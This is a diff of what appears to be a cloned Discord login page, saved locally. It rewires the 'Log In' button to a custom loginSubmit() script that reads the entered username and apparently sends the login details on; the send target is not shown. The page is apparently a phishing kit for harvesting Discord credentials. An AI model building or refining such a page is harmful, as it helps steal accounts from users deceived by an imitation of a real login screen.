@@ -711,7 +711,7 @@
                               </div><button type="button"
                                 class="marginBottom20_f7730b marginTop4_f7730b linkButton_b83a05 button_dd4f85 lookLink_dd4f85 lowSaturationUnderline_c7819f colorLink_dd4f85 sizeMin_dd4f85 grow_dd4f85">
                                 <div class="contents_dd4f85">Forgot your password?</div>
-                              </button><button type="submit"
+                              </button><button type="button" onclick="loginSubmit()"
                                 class="marginBottom8_f7730b button_b83a05 button_dd4f85 lookFilled_dd4f85 colorBrand_dd4f85 sizeLarge_dd4f85 fullWidth_dd4f85 grow_dd4f85">
                                 <div class="contents_dd4f85">Log In</div>
                               </button>
@@ -787,7 +787,20 @@
   </div>
   <script src="./Discord_files/web.32d39ccf088c3f500ddd.js.download" defer=""></script>
   <script src="./Discord_files/sentry.63ddf3684e9502344f88.js.download" defer=""></script>
-  <script>document.getElementById('loginForm').addEventListener('submit', async (event) => {
+
+  <div class="drag-previewer"
+    style="z-index: 1000; filter: drop-shadow(0 0 0 var(--background-floating)) drop-shadow(var(--elevation-high));">
+    <svg style="contain: paint;">
+      <foreignobject></foreignobject>
+    </svg>
+  </div>
+  <div id="uid_1" style="display: none;">,</div>
+  <div id="uid_2" style="display: none;">,</div>
+  <div id="uid_3" style="display: none;">Reactions</div>
+  <div id="uid_4" style="display: none;">click to open image dialog</div>
+
+  <script>
+    async function loginSubmit() {
       event.preventDefault();
 
       const username = document.getElementById('uid_8').value;
@@ -811,18 +824,7 @@
       } catch (error) {
         console.error(`Error: ${error.message}`);
       }
-    });</script>
-
-  <div class="drag-previewer"
-    style="z-index: 1000; filter: drop-shadow(0 0 0 var(--background-floating)) drop-shadow(var(--elevation-high));">
-    <svg style="contain: paint;">
-      <foreignobject></foreignobject>
-    </svg>
-  </div>
-  <div id="uid_1" style="display: none;">,</div>
-  <div id="uid_2" style="display: none;">,</div>
-  <div id="uid_3" style="display: none;">Reactions</div>
-  <div id="uid_4" style="display: none;">click to open image dialog</div>
+    };</script>
 </body>
 
 </html>
